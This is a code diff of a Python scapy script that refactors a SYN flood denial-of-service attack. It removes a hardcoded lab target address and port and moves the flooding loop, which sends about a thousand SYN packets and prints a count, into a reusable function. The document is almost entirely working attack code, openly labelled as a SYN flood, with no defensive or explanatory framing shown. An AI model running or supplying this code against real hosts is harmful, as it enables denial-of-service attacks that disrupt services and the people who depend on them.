@@ -2,8 +2,6 @@ from scapy.layers.inet import TCP, IP
 from scapy.sendrecv import send
 import socket, random, sys
 
-target = "192.168.198.130"
-port = 80
 def sendSYN(target, port):
     # creating packet
     # insert IP header fields
@@ -23,15 +21,17 @@ def sendSYN(target, port):
     #set SYN flag
     tcp.flags = 'S'
     send(ip/tcp)
-    return;
+    return
 
-# SYNFlood attack
-print(f"Launch SYN FLOOD attack at {target}:{port} with SYN packets.")
 
-count = 0
+def sf(target, port):
+    # SYNFlood attack
+    print(f"Launch SYN FLOOD attack at {target}:{port} with SYN packets.")
 
-while count <= 1000:
-    sendSYN(target,port)
-    count += 1
-    print(f"Total packets sent: {count}")
-    print("==========================================")
+    count = 0
+
+    while count <= 1000:
+        sendSYN(target, port)
+        count += 1
+        print(f"Total packets sent: {count}")
+        print("==========================================")
